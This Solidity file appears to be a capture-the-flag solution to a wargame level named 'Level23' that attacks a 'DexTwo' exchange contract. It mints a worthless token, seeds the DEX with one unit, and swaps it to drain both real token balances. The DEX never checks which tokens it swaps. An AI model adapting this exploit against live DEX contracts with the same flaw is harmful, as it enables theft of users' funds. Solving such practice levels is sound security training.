// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "./DexTwo.sol";

contract Level23 {
    DexTwo dexTwo;
    MyToken myToken;

    constructor(address dexTwoAddr) public {
        dexTwo = DexTwo(dexTwoAddr);
        myToken = new MyToken(10 * (10**18));
    }

    function main() public {
        ERC20(dexTwo.token1()).approve(address(dexTwo), 2**256 - 1);
        ERC20(dexTwo.token2()).approve(address(dexTwo), 2**256 - 1);
        myToken.approve(address(dexTwo), 2**256 - 1);

        myToken.transfer(address(dexTwo), 1);
        dexTwo.swap(address(myToken), dexTwo.token1(), 1);
        dexTwo.swap(address(myToken), dexTwo.token2(), 2);
    }
}

contract MyToken is ERC20 {
    constructor(uint256 initialSupply) public ERC20("MyToken", "MYT") {
        _mint(msg.sender, initialSupply);
    }
}
